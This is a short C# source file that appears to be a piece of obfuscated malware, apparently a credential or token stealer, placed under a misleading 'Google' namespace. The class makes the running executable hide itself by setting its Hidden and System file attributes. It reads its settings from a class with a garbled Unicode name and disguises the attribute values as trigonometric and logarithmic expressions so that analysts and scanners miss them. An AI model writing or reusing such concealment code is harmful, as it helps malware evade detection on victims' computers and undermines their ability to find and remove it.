using System;
using System.IO;
using System.Reflection;

namespace Google.TOKENSs
{
	internal sealed class Attributes
	{
		public static void set_hidden()
		{
			bool attribute_hidden = ڋ۶ﻌۅڑڋږٱۋۓګ۶ٷګﺁ.attribute_hidden;
			bool flag = attribute_hidden;
			if (flag)
			{
				Attributes.file.Attributes |= (FileAttributes)Convert.ToInt32(2.5403023058681398 - Math.Cos(1.0));
			}
		}
		public static void set_system()
		{
			bool attribute_system = ڋ۶ﻌۅڑڋږٱۋۓګ۶ٷګﺁ.attribute_system;
			bool flag = attribute_system;
			if (flag)
			{
				Attributes.file.Attributes |= (FileAttributes)Convert.ToInt32(4.693147180559945 - Math.Log(2.0));
			}
		}
		private static string executable = Assembly.GetEntryAssembly().Location;
		private static FileInfo file = new FileInfo(Attributes.executable);
	}
}